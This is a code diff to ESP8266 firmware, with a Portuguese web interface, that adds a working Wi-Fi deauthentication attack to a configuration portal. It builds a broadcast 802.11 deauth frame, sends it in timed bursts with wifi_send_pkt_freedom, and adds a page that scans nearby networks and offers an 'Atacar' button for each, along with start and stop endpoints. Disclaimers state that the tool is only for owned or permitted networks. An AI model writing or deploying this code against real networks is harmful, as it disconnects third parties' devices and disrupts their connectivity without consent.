@@ -6,6 +6,10 @@
 #include <LittleFS.h>
 #include <time.h>
 
+extern "C" {
+  #include <user_interface.h>
+}
+
 #include "app_state.h"
 
 namespace
@@ -171,6 +175,57 @@ namespace
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
   }
 
+  // ─── Deauther ─────────────────────────────────────────────────────────────
+  // NOTE: use only on networks you own or have explicit permission to test.
+  // Sending deauthentication frames to third-party networks is illegal.
+
+  static bool deauthRunning = false;
+  static uint8_t deauthTarget[6] = {0};
+  static uint8_t deauthCh = 1;
+  static String deauthTargetSsid;
+  static unsigned long deauthLastPacket = 0;
+  static constexpr unsigned long DEAUTH_INTERVAL_MS = 100;
+  static constexpr int DEAUTH_BURST = 5;
+
+  // 802.11 deauthentication management frame
+  static uint8_t deauthFrame[26] = {
+    0xC0, 0x00,                         // frame control: deauth
+    0x00, 0x00,                         // duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst: broadcast (kick all clients)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: target BSSID  (offset 10)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid: target BSSID (offset 16)
+    0x00, 0x00,                         // sequence number
+    0x07, 0x00                          // reason: class-3 frame from non-assoc STA
+  };
+
+  bool parseBssid(const String &str, uint8_t out[6])
+  {
+    if (str.length() < 17)
+      return false;
+    for (int i = 0; i < 6; i++)
+    {
+      out[i] = (uint8_t)strtol(str.substring(i * 3, i * 3 + 2).c_str(), nullptr, 16);
+    }
+    return true;
+  }
+
+  void sendDeauthBurst()
+  {
+    if (!deauthRunning)
+      return;
+    unsigned long now = millis();
+    if (now - deauthLastPacket < DEAUTH_INTERVAL_MS)
+      return;
+    deauthLastPacket = now;
+
+    wifi_set_channel(deauthCh);
+    memcpy(&deauthFrame[10], deauthTarget, 6);
+    memcpy(&deauthFrame[16], deauthTarget, 6);
+    for (int i = 0; i < DEAUTH_BURST; i++)
+      wifi_send_pkt_freedom(deauthFrame, sizeof(deauthFrame), 0);
+  }
+  // ──────────────────────────────────────────────────────────────────────────
+
   void handleCaptiveRedirect()
   {
     server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
@@ -243,6 +298,7 @@ namespace
     page += "<button type='submit'>Salvar e conectar</button></form>";
     page += "<form method='get' action='/'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
     page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
+    page += "<form method='get' action='/deauther'><button class='secondary' style='background:#3a1a1a;color:#ff7675' type='submit'>&#128246; Wi-Fi Deauther</button></form>";
     page += "<p class='muted'>API: /api/status</p>";
     page += "</div></body></html>";
 
@@ -289,6 +345,15 @@ namespace
     doc["screen_change_interval_ms"] = screenChangeIntervalMs;
     doc["timezone_offset_hours"] = timezoneOffsetHours;
     doc["oled_brightness"] = oledBrightness;
+    doc["deauth_running"] = deauthRunning;
+    doc["deauth_target_ssid"] = deauthTargetSsid;
+    {
+      char bssidBuf[18] = {0};
+      snprintf(bssidBuf, sizeof(bssidBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
+               deauthTarget[0], deauthTarget[1], deauthTarget[2],
+               deauthTarget[3], deauthTarget[4], deauthTarget[5]);
+      doc["deauth_target_bssid"] = deauthRunning ? String(bssidBuf) : String("-");
+    }
 
     String payload;
     serializeJson(doc, payload);
@@ -338,6 +403,155 @@ namespace
     connectStationWiFi();
   }
 
+  void handleDeautherPage()
+  {
+    String page;
+    page += "<!doctype html><html><head><meta charset='utf-8'>";
+    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
+    page += "<style>";
+    page += "body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:640px;margin:0 auto;padding:20px}";
+    page += ".card{background:#1b1b1b;padding:16px;border-radius:14px;margin:10px 0}";
+    page += "button{padding:9px 16px;border:0;border-radius:8px;cursor:pointer;font-weight:bold}";
+    page += ".btn-scan{background:#00a6ff;color:#fff;width:100%;padding:12px;margin:8px 0;border-radius:10px}";
+    page += ".btn-atk{background:#ff4757;color:#fff;font-size:12px}";
+    page += ".btn-stop{background:#2ed573;color:#000}";
+    page += ".btn-back{background:#2a2a2a;color:#fff;width:100%;padding:12px;border-radius:10px;margin-top:8px}";
+    page += "table{width:100%;border-collapse:collapse}";
+    page += "th,td{text-align:left;padding:7px 5px;border-bottom:1px solid #2a2a2a;font-size:13px}";
+    page += "th{color:#aaa;font-size:11px;text-transform:uppercase}";
+    page += ".warn{background:#2d1a1a;border-radius:10px;padding:12px;color:#ff7675;font-size:13px;margin-bottom:12px}";
+    page += ".statusbar{background:#1a2d1a;border-radius:10px;padding:12px;color:#58d68d;font-size:13px;margin-bottom:12px;display:none;word-break:break-all}";
+    page += ".loader{display:inline-block;width:15px;height:15px;border:2px solid #444;border-top-color:#fff;border-radius:50%;animation:sp 0.8s linear infinite;vertical-align:middle;margin-right:6px}";
+    page += "@keyframes sp{to{transform:rotate(360deg)}}";
+    page += "</style></head><body>";
+    page += "<div class='card'>";
+    page += "<h2>&#128246; Wi-Fi Deauther</h2>";
+    page += "<div class='warn'>&#9888;&#65039; Use apenas em redes pr&oacute;prias ou com permiss&atilde;o expressa. O uso indevido &eacute; ilegal.</div>";
+    page += "<div class='statusbar' id='sbar'>&#128225; Deauth ativo: <span id='tname'></span> &nbsp; <button class='btn-stop' onclick='stopDeauth()'>&#9632; Parar</button></div>";
+    page += "<button class='btn-scan' onclick='scan()'>&#128268; Escanear Redes</button>";
+    page += "<div id='loader' style='display:none;text-align:center;padding:12px'><span class='loader'></span>Escaneando, aguarde...</div>";
+    page += "<div id='result'></div>";
+    page += "<button class='btn-back' onclick=\"location.href='/'\">&#8592; Voltar</button>";
+    page += "</div>";
+    page += "<script>";
+    page += "var nets=[];";
+    page += "var scanning=false;";
+    page += "async function scan(){";
+    page += "  if(scanning)return;";
+    page += "  scanning=true;";
+    page += "  document.getElementById('loader').style.display='block';";
+    page += "  document.getElementById('result').innerHTML='';";
+    page += "  try{";
+    page += "    var r=await fetch('/api/scan_ap');";
+    page += "    nets=await r.json();";
+    page += "    if(nets.length===0){";
+    page += "      document.getElementById('result').innerHTML='<p style=\"color:#aaa\">Nenhuma rede encontrada.</p>';";
+    page += "    } else {";
+    page += "      var h='<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>dBm</th><th></th></tr>';";
+    page += "      nets.forEach(function(n,i){";
+    page += "        h+='<tr>';";
+    page += "        h+='<td>'+n.ssid+'</td>';";
+    page += "        h+='<td style=\"font-size:11px\">'+n.bssid+'</td>';";
+    page += "        h+='<td>'+n.channel+'</td>';";
+    page += "        h+='<td>'+n.rssi+'</td>';";
+    page += "        h+='<td><button class=\"btn-atk\" onclick=\"startDeauth('+i+')\">&#9889; Atacar</button></td>';";
+    page += "        h+='</tr>';";
+    page += "      });";
+    page += "      h+='</table>';";
+    page += "      document.getElementById('result').innerHTML=h;";
+    page += "    }";
+    page += "  } catch(e){";
+    page += "    document.getElementById('result').innerHTML='<p style=\"color:#ff7675\">Erro ao escanear.</p>';";
+    page += "  }";
+    page += "  document.getElementById('loader').style.display='none';";
+    page += "  scanning=false;";
+    page += "}";
+    page += "async function startDeauth(idx){";
+    page += "  var n=nets[idx];";
+    page += "  var fd=new FormData();";
+    page += "  fd.append('bssid',n.bssid);";
+    page += "  fd.append('channel',n.channel);";
+    page += "  fd.append('ssid',n.ssid);";
+    page += "  var r=await fetch('/api/deauth/start',{method:'POST',body:fd});";
+    page += "  var j=await r.json();";
+    page += "  if(j.ok){";
+    page += "    document.getElementById('tname').innerText=n.ssid+' ('+n.bssid+')';";
+    page += "    document.getElementById('sbar').style.display='block';";
+    page += "  }";
+    page += "}";
+    page += "async function stopDeauth(){";
+    page += "  await fetch('/api/deauth/stop',{method:'POST'});";
+    page += "  document.getElementById('sbar').style.display='none';";
+    page += "}";
+    page += "</script></body></html>";
+
+    server.send(200, "text/html; charset=utf-8", page);
+  }
+
+  void handleScanAp()
+  {
+    int n = WiFi.scanNetworks();
+
+    if (n < 0)
+    {
+      server.send(503, "application/json; charset=utf-8", "{\"error\":\"Falha ao escanear redes\"}");
+      return;
+    }
+
+    JsonDocument doc;
+    JsonArray arr = doc.to<JsonArray>();
+
+    for (int i = 0; i < n; i++)
+    {
+      String ssid = WiFi.SSID(i);
+      if (ssid.length() == 0)
+        continue;
+      JsonObject obj = arr.add<JsonObject>();
+      obj["ssid"] = ssid;
+      obj["bssid"] = WiFi.BSSIDstr(i);
+      obj["channel"] = WiFi.channel(i);
+      obj["rssi"] = WiFi.RSSI(i);
+    }
+
+    WiFi.scanDelete();
+
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
+  }
+
+  void handleDeauthStart()
+  {
+    String bssidStr = server.arg("bssid");
+    String chStr = server.arg("channel");
+    String ssidStr = server.arg("ssid");
+
+    uint8_t parsed[6];
+    if (!parseBssid(bssidStr, parsed))
+    {
+      server.send(400, "application/json; charset=utf-8", "{\"ok\":false,\"error\":\"BSSID invalido\"}");
+      return;
+    }
+
+    int ch = parseIntBounded(chStr, 1, 13, 1);
+
+    memcpy(deauthTarget, parsed, 6);
+    deauthCh = (uint8_t)ch;
+    deauthTargetSsid = ssidStr;
+    deauthRunning = true;
+    deauthLastPacket = 0;
+
+    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
+  }
+
+  void handleDeauthStop()
+  {
+    deauthRunning = false;
+    memset(deauthTarget, 0, 6);
+    deauthTargetSsid = "";
+    server.send(200, "application/json; charset=utf-8", "{\"ok\":true}");
+  }
+
   void startConfigPortal()
   {
     server.on("/", HTTP_GET, handleRoot);
@@ -350,6 +564,10 @@ namespace
     server.on("/status", HTTP_GET, handleStatusPage);
     server.on("/api/status", HTTP_GET, handleStatusJson);
     server.on("/save", HTTP_POST, handleSave);
+    server.on("/deauther", HTTP_GET, handleDeautherPage);
+    server.on("/api/scan_ap", HTTP_GET, handleScanAp);
+    server.on("/api/deauth/start", HTTP_POST, handleDeauthStart);
+    server.on("/api/deauth/stop", HTTP_POST, handleDeauthStop);
     server.onNotFound(handleCaptiveRedirect);
     server.begin();
   }
@@ -381,4 +599,5 @@ void handlePortalClient()
 {
   server.handleClient();
   dnsServer.processNextRequest();
+  sendDeauthBurst();
 }
